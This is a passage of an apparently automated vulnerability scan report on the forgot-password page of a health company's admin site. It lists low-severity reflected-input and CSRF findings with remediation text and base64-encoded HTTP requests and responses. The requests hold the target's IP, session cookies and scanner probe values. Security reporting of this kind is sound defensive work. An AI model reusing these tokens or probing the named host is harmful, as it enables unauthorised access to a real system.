ICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImlucHV0LWdyb3VwLXRleHQiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPHNwYW4gY2xhc3M9ImZhcyBmYS1lbnZlbG9wZSI+PC9zcGFuPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0icm93IHJvdy1lcS1oZWlnaHQiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbC04Ij4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZC1mbGV4IGgtMTAwIGFsaWduLWl0ZW1zLWNlbnRlciI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YSBocmVmPSJodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL2xvZ2luIj5CYWNrIHRvIGxvZ2luPC9hPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2wtNCI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImFjdGlvbiIgdmFsdWU9ImZvcmdvdFBhc3N3b3JkIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGJ1dHRvbiB0eXBlPSJzdWJtaXQiIGNsYXNzPSJidG4gYnRuLWRhcmsgYnRuLWJsb2NrIj5TdWJtaXQ8L2J1dHRvbj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICA8L2Zvcm0+CiAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICA8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCIgc3JjPSJodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL2pzL3ZhbGlkYXRpb24uanMiPjwvc2NyaXB0PgogICAgICAgIDxzY3JpcHQ+CiAgICAgICAgZnVuY3Rpb24gdmFsaWRhdGVGb3Jnb3RQYXNzd29yZCgpIHsKICAgICAgICAgICAgdmFyIGVtYWlsRXJyID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImVtYWlsRXJyIik7CiAgICAgICAgICAgIHZhciBlbWFpbCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJlbWFpbCIpLnZhbHVlLnRyaW0oKTsKICAgICAgICAgICAgZW1haWxFcnIuaW5uZXJIVE1MID0gJyc7CgogICAgICAgICAgICBpZiAoIXZhbGlkYXRlRW1haWwoZW1haWwpKSB7CiAgICAgICAgICAgICAgICBlbWFpbEVyci5pbm5lckhUTUwgPSAnUGxlYXNlIGVudGVyIHZhbGlkIGVtYWlsIGFkZHJlc3MuJzsKICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICAgICAgfQogICAgICAgICAgICByZXR1cm4gdHJ1ZTsKICAgICAgICB9CiAgICAgICAgPC9zY3JpcHQ+CiAgICA8L2JvZHk+CjwvaHRtbD4K]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>77689080252201984</serialNumber>
    <type>4197376</type>
    <name><![CDATA[Input returned in response (reflected)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/forgotPassword]]></path>
    <location><![CDATA[/forgotPassword [URL path filename]]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>]]></issueBackground>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20: Improper Input Validation</a></li><li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The value of the URL path filename is copied into the application's response.]]></issueDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvZm9yZ290UGFzc3dvcmRrem5xd3N6OTZtIEhUVFAvMg0KSG9zdDogYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3NpZ25lZC1leGNoYW5nZTt2PWIzO3E9MC43DQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTO3E9MC45LGVuO3E9MC44DQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTMxLjAuNjc3OC44NiBTYWZhcmkvNTM3LjM2DQpDb25uZWN0aW9uOiBjbG9zZQ0KQ2FjaGUtQ29udHJvbDogbWF4LWFnZT0wDQpDb29raWU6IFBIUFNFU1NJRD1jYzV1N3BrNzg4MTB1dmNhcW0xbGtybXFtdDsgc2NyZWVuV2lkdGg9ODAwOyBBV1NBTEI9TklzaVhta3BVQy9VSDRHM1RUOXBLSld2V2pkWndMYXo5SWRLT0w3SU0ybUpTclpIbEN6SEdNOG1iQUNqcUF1OTFRSlNEM2xTSkFSYzl6RVVYTU5ZMjZSY2JZamhoVnMzNW5HR084ajc1SkV4ZTVHUTZyOHI0Yno0cEttMzsgQVdTQUxCQ09SUz1OSXNpWG1rcFVDL1VINEczVFQ5cEtKV3ZXamRad0xhejlJZEtPTDdJTTJtSlNyWkhsQ3pIR004bWJBQ2pxQXU5MVFKU0QzbFNKQVJjOXpFVVhNTlkyNlJjYllqaGhWczM1bkdHTzhqNzVKRXhlNUdRNnI4cjRiejRwS20zDQpPcmlnaW46IGh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20NClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClJlZmVyZXI6IGh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vZm9yZ290UGFzc3dvcmQNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkDQpTZWMtQ0gtVUE6ICIuTm90L0EpQnJhbmQiO3Y9Ijk5IiwgIkdvb2dsZSBDaHJvbWUiO3Y9IjEzMSIsICJDaHJvbWl1bSI7dj0iMTMxIg0KU2VjLUNILVVBLVBsYXRmb3JtOiBXaW5kb3dzDQpTZWMtQ0gtVUEtTW9iaWxlOiA/MA0KQ29udGVudC1MZW5ndGg6IDU5DQoNCmVtYWlsPXRiaEJCUEt0JTQwYnVycGNvbGxhYm9yYXRvci5uZXQmYWN0aW9uPWZvcmdvdFBhc3N3b3Jk]]></request>
      <response base64="true"><![CDATA[]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>8568562071913782272</serialNumber>
    <type>2098944</type>
    <name><![CDATA[Cross-site request forgery]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/forgotPassword]]></path>
    <location><![CDATA[/forgotPassword]]></location>
    <severity>Information</severity>
    <confidence>Tentative</confidence>
    <issueBackground><![CDATA[<p>Cross-site request forgery (CSRF) vulnerabilities may arise when applications rely solely on HTTP cookies to identify the user that has issued a particular request. Because browsers automatically add cookies to requests regardless of their origin, it may be possible for an attacker to create a malicious web site that forges a cross-domain request to the vulnerable application. For a request to be vulnerable to CSRF, the following conditions must hold:</p>
<ul>
<li>The request can be issued cross-domain, for example using an HTML form. If the request contains non-standard headers or body content, then it may only be issuable from a page that originated on the same domain.</li>
<li>The application relies solely on HTTP cookies or Basic Authentication to identify the user that issued the request. If the application places session-related tokens elsewhere within the request, then it may not be vulnerable.</li>
<li>The request performs some privileged action within the application, which modifies the application's state based on the identity of the issuing user.</li><li>The attacker can determine all the parameters required to construct a request that performs the action. If the request contains any values that the attacker cannot determine or predict, then it is not vulnerable.</li></ul>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to protect against CSRF vulnerabilities is to include within relevant requests an additional token that is not transmitted in a cookie: for example, a parameter in a hidden form field. This additional token should contain sufficient entropy, and be generated using a cryptographic random number generator, such that it is not feasible for an attacker to determine or predict the value of any token that was issued to another user. The token should be associated with the user's session, and the application should validate that the correct token is received before performing any action resulting from the request.</p>
<p>An alternative approach, which may be easier to implement, is to validate that Host and Referer headers in relevant requests are both present and contain the same domain name. However, this approach is somewhat less robust: historically, quirks in browsers and plugins have often enabled attackers to forge cross-domain requests that manipulate these headers to bypass such defenses. </p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/web-security/csrf">Web Security Academy: Cross-site request forgery</a></li><li><a href="https://support.portswigger.net/customer/portal/articles/1965674-using-burp-to-test-for-cross-site-request-forgery-csrf-">Using Burp to Test for Cross-Site Request Forgery</a></li><li><a href="https://media.blackhat.com/eu-13/briefings/Lundeen/bh-eu-13-deputies-still-confused-lundeen-wp.pdf">The Deputies Are Still Confused</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/352.html">CWE-352: Cross-Site Request Forgery (CSRF)</a></li><li><a href="https://capec.mitre.org/data/definitions/62.html">CAPEC-62: Cross Site Request Forgery</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The request appears to be vulnerable to cross-site request forgery (CSRF) attacks against unauthenticated functionality. This is unlikely to constitute a security vulnerability in its own right, however it may facilitate exploitation of other vulnerabilities affecting application users.]]></issueDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvZm9yZ290UGFzc3dvcmQgSFRUUC8yDQpIb3N0OiBhZG1pbi5taXJhZG9yaGVhbHRoLmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjcNCkFjY2VwdC1MYW5ndWFnZTogZW4tVVM7cT0wLjksZW47cT0wLjgNClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzEuMC42Nzc4Ljg2IFNhZmFyaS81MzcuMzYNCkNvbm5lY3Rpb246IGNsb3NlDQpDYWNoZS1Db250cm9sOiBtYXgtYWdlPTANCkNvb2tpZTogUEhQU0VTU0lEPWNjNXU3cGs3ODgxMHV2Y2FxbTFsa3JtcW10OyBzY3JlZW5XaWR0aD04MDA7IEFXU0FMQj1OSXNpWG1rcFVDL1VINEczVFQ5cEtKV3ZXamRad0xhejlJZEtPTDdJTTJtSlNyWkhsQ3pIR004bWJBQ2pxQXU5MVFKU0QzbFNKQVJjOXpFVVhNTlkyNlJjYllqaGhWczM1bkdHTzhqNzVKRXhlNUdRNnI4cjRiejRwS20zOyBBV1NBTEJDT1JTPU5Jc2lYbWtwVUMvVUg0RzNUVDlwS0pXdldqZFp3TGF6OUlkS09MN0lNMm1KU3JaSGxDekhHTThtYkFDanFBdTkxUUpTRDNsU0pBUmM5ekVVWE1OWTI2UmNiWWpoaFZzMzVuR0dPOGo3NUpFeGU1R1E2cjhyNGJ6NHBLbTMNCk9yaWdpbjogaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbQ0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KUmVmZXJlcjogaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9mb3Jnb3RQYXNzd29yZA0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNClNlYy1DSC1VQTogIi5Ob3QvQSlCcmFuZCI7dj0iOTkiLCAiR29vZ2xlIENocm9tZSI7dj0iMTMxIiwgIkNocm9taXVtIjt2PSIxMzEiDQpTZWMtQ0gtVUEtUGxhdGZvcm06IFdpbmRvd3MNClNlYy1DSC1VQS1Nb2JpbGU6ID8wDQpDb250ZW50LUxlbmd0aDogNTkNCg0KZW1haWw9dGJoQkJQS3QlNDBidXJwY29sbGFib3JhdG9yLm5ldCZhY3Rpb249Zm9yZ290UGFzc3dvcmQ=]]></request>
      <response base64="true"><![CDATA[SFRUUC8yIDIwMCBPSw0KRGF0ZTogU2F0LCAxNCBEZWMgMjAyNCAyMzo1Njo0MiBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04DQpDb250ZW50LUxlbmd0aDogNDQ2NA0KU2V0LUNvb2tpZTogQVdTQUxCPU9Ka2RBV3NGVXRlVzRuTTArMWc4d2ZXU2tDT2xabG1zYU42RmU3NUNzZllZVzlFeGQxS1l6S2ZnRFpMUVFtaHNIeDVmc29hRG9xaDlFcEJKM0JjMVB0MFdOSEZiNElWS2ZyZzNiUklQYjdzcjZqRGw5enRUTXJlb3FDRDM7IEV4cGlyZXM9U2F0LCAyMSBEZWMgMjAyNCAyMzo1Njo0MiBHTVQ7IFBhdGg9Lw0KU2V0LUNvb2tpZTogQVdTQUxCQ09SUz1PSmtkQVdzRlV0ZVc0bk0wKzFnOHdmV1NrQ09sWmxtc2FONkZlNzVDc2ZZWVc5RXhkMUtZektmZ0RaTFFRbWhzSHg1ZnNvYURvcWg5RXBCSjNCYzFQdDBXTkhGYjRJVktmcmczYlJJUGI3c3I2akRsOXp0VE1yZW9xQ0QzOyBFeHBpcmVzPVNhdCwgMjEgRGVjIDIwMjQgMjM6NTY6NDIgR01UOyBQYXRoPS87IFNhbWVTaXRlPU5vbmU7IFNlY3VyZQ0KU2VydmVyOiBBcGFjaGUvMi40LjUyICgpIFBIUC84LjIuOQ0KWC1Qb3dlcmVkLUJ5OiBQSFAvOC4yLjkNCkV4cGlyZXM6IFRodSwgMTkgTm92IDE5ODEgMDg6NTI6MDAgR01UDQpDYWNoZS1Db250cm9sOiBuby1zdG9yZSwgbm8tY2FjaGUsIG11c3QtcmV2YWxpZGF0ZQ0KUHJhZ21hOiBuby1jYWNoZQ0KDQo8aHRtbD4KICAgICAgICA8aGVhZD4KICAgICAgICA8dGl0bGU+TWlyYWRvciBJbnNpZ2h0czwvdGl0bGU+CiAgICAgICAgPG1ldGEgY2hhcnNldD0idXRmLTgiPgogICAgICAgIDxtZXRhIG5hbWU9ImRlc2NyaXB0aW9uIiBjb250ZW50PSJNaXJhZG9yIEhlYWx0aCI+CiAgICAgICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAsIG1heGltdW0tc2NhbGU9MS4wLCB1c2VyLXNjYWxhYmxlPW5vIiAvPgogICAgICAgIDxsaW5rIHJlbD0iaWNvbiIgdHlwZT0iaW1hZ2UvaWNvIiBocmVmPSJodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL2ltYWdlcy9mYXZpY29uLmljbyIvPgoKICAgICAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Imh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vY3NzL3NlbGVjdDIubWluLmNzcyI+CiAgICAgICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL2Nzcy9kYXRlcmFuZ2VwaWNrZXIuY3NzIj4KICAgICAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Imh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vY3NzL2ZvbnRhd2Vzb21lLWZyZWUtYWxsLm1pbi5jc3MiPgogICAgICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9jc3MvZGF0YVRhYmxlcy5ib290c3RyYXA0LmNzcyI+CiAgICAgICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL2Nzcy9yZXNwb25zaXZlLmJvb3RzdHJhcDQuY3NzIj4KICAgICAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Imh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vY3NzL2J1dHRvbnMuYm9vdHN0cmFwNC5jc3MiPgogICAgICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9jc3MvYWRtaW5sdGUubWluLmNzcyI+CiAgICAgICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL2Nzcy9ib290c3RyYXAtZGF0ZXBpY2tlci5taW4uY3NzIj4KICAgICAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Imh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vY3NzL2ZvbnQtYXdlc29tZS5taW4uY3NzIj4KICAgICAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Imh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vY3NzL2Jvb3RzdHJhcC1kYXRlcGlja2VyLm1pbi5jc3MiPgogICAgICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9jc3MvbWFpbi5jc3M/dj1mNzJkNDIiPgoKICAgICAgICA8c2NyaXB0PnZhciBhY3RpdmVUaGVtZSA9ICdsaWdodCc8L3NjcmlwdD4gICAgICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9jc3MvbWFpbi1saWdodC5jc3M/dj1mNzJkNDIiPgoKICAgICAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Imh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vZm9udHMvc3R5bGVzaGVldC5jc3MiPgogICAgICAgIDxzY3JpcHQ+CiAgICAgICAgICAgIGRvY3VtZW50LmNvb2tpZSA9ICJzY3JlZW5XaWR0aD0iK3NjcmVlbi53aWR0aCsiOzMwO3BhdGg9LyI7CiAgICAgICAgPC9zY3JpcHQ+CiAgICA8L2hlYWQ+CiAgICA8Ym9keSBjbGFzcz0ibG9naW4tcGFnZSI+CiAgICAgICAgPGRpdiBjbGFzcz0ibG9naW4tYm94Ij4KICAgICAgICAgICAgPGRpdiBjbGFzcz0iY2FyZCI+CiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkLWJvZHkiPgogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImxvZ2luLWxvZ28iIHN0eWxlPSJtYXJnaW4tdG9wOiAwLjZyZW07Ij4KICAgICAgICAgICAgICAgICAgICAgICAgPGltZyBjbGFzcz0idy03NSIgc3JjPSJodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL2ltYWdlcy9taXJhZG9yX2luc2lnaHRzX2xvZ28ucG5nIiAvPgogICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgIDxwIGNsYXNzPSJsb2dpbi1ib3gtbXNnIj5Gb3Jnb3QgUGFzc3dvcmQ8L3A+CgogICAgICAgICAgICAgICAgICAgIDxmb3JtIG1ldGhvZD0icG9zdCIgaWQ9ImZvcmdvdFBhc3N3b3JkIiBuYW1lPSJmb3Jnb3RQYXNzd29yZCIgY2xhc3M9Im1iLTAiIG9uc3VibWl0PSJyZXR1cm4gdmFsaWRhdGVGb3Jnb3RQYXNzd29yZCgpIj4KICAgICAgICAgICAgICAgICAgICAgICAgPHNwYW4gaWQ9ImVtYWlsRXJyIiBjbGFzcz0iaW52YWxpZC1mZWVkYmFjayBkLWJsb2NrIj5FbWFpbCBkb2VzIG5vdCBleGlzdC48L3NwYW4+CiAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImQtYmxvY2siPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iaW5wdXQtZ3JvdXAgbWItMyI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGlucHV0IG5hbWU9ImVtYWlsIiBpZD0iZW1haWwiIHR5cGU9ImVtYWlsIiBjbGFzcz0iZm9ybS1jb250cm9sIiBwbGFjZWhvbGRlcj0iRW1haWwiIHZhbHVlPSJ0YmhCQlBLdEBidXJwY29sbGFib3JhdG9yLm5ldCI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iaW5wdXQtZ3JvdXAtYXBwZW5kIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iaW5wdXQtZ3JvdXAtdGV4dCI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8c3BhbiBjbGFzcz0iZmFzIGZhLWVudmVsb3BlIj48L3NwYW4+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJyb3cgcm93LWVxLWhlaWdodCI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29sLTgiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJkLWZsZXggaC0xMDAgYWxpZ24taXRlbXMtY2VudGVyIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxhIGhyZWY9Imh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vbG9naW4iPkJhY2sgdG8gbG9naW48L2E+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbC00Ij4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYWN0aW9uIiB2YWx1ZT0iZm9yZ290UGFzc3dvcmQiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ0biBidG4tZGFyayBidG4tYmxvY2siPlN1Ym1pdDwvYnV0dG9uPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgIDwvZm9ybT4KICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgIDxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0IiBzcmM9Imh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vanMvdmFsaWRhdGlvbi5qcyI+PC9zY3JpcHQ+CiAgICAgICAgPHNjcmlwdD4KICAgICAgICBmdW5jdGlvbiB2YWxpZGF0ZUZvcmdvdFBhc3N3b3JkKCkgewogICAgICAgICAgICB2YXIgZW1haWxFcnIgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiZW1haWxFcnIiKTsKICAgICAgICAgICAgdmFyIGVtYWlsID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImVtYWlsIikudmFsdWUudHJpbSgpOwogICAgICAgICAgICBlbWFpbEVyci5pbm5lckhUTUwgPSAnJzsKCiAgICAgICAgICAgIGlmICghdmFsaWRhdGVFbWFpbChlbWFpbCkpIHsKICAgICAgICAgICAgICAgIGVtYWlsRXJyLmlubmVySFRNTCA9ICdQbGVhc2UgZW50ZXIgdmFsaWQgZW1haWwgYWRkcmVzcy4nOwogICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgICAgICB9CiAgICAgICAgICAgIHJldHVybiB0cnVlOwogICAgICAgIH0KICAgICAgICA8L3NjcmlwdD4KICAgIDwvYm9keT4KPC9odG1sPgo=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvZm9yZ290UGFzc3dvcmQgSFRUUC8yDQpIb3N0OiBhZG1pbi5taXJhZG9yaGVhbHRoLmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjcNCkFjY2VwdC1MYW5ndWFnZTogZW4tVVM7cT0wLjksZW47cT0wLjgNClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzEuMC42Nzc4Ljg2IFNhZmFyaS81MzcuMzYNCkNvbm5lY3Rpb246IGNsb3NlDQpDYWNoZS1Db250cm9sOiBtYXgtYWdlPTANCkNvb2tpZTogUEhQU0VTU0lEPWNjNXU3cGs3ODgxMHV2Y2FxbTFsa3JtcW10OyBzY3JlZW5XaWR0aD04MDA7IEFXU0FMQj1OSXNpWG1rcFVDL1VINEczVFQ5cEtKV3ZXamRad0xhejlJZEtPTDdJTTJtSlNyWkhsQ3pIR004bWJBQ2pxQXU5MVFKU0QzbFNKQVJjOXpFVVhNTlkyNlJjYllqaGhWczM1bkdHTzhqNzVKRXhlNUdRNnI4cjRiejRwS20zOyBBV1NBTEJDT1JTPU5Jc2lYbWtwVUMvVUg0RzNUVDlwS0pXdldqZFp3TGF6OUlkS09MN0lNMm1KU3JaSGxDekhHTThtYkFDanFBdTkxUUpTRDNsU0pBUmM5ekVVWE1OWTI2UmNiWWpoaFZzMzVuR0dPOGo3NUpFeGU1R1E2cjhyNGJ6NHBLbTMNCk9yaWdpbjogaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbQ0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KUmVmZXJlcjogaHR0cHM6Ly9kUmdZVkdUZGRacE9hR3BrZEdlLmNvbS9mb3Jnb3RQYXNzd29yZA0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNClNlYy1DSC1VQTogIi5Ob3QvQSlCcmFuZCI7dj0iOTkiLCAiR29vZ2xlIENocm9tZSI7dj0iMTMxIiwgIkNocm9taXVtIjt2PSIxMzEiDQpTZWMtQ0gtVUEtUGxhdGZvcm06IFdpbmRvd3MNClNlYy1DSC1VQS1Nb2JpbGU6ID8wDQpDb250ZW50LUxlbmd0aDogNTkNCg0KZW1haWw9dGJoQkJQS3QlNDBidXJwY29sbGFib3JhdG9yLm5ldCZhY3Rpb249Zm9yZ290UGFzc3dvcm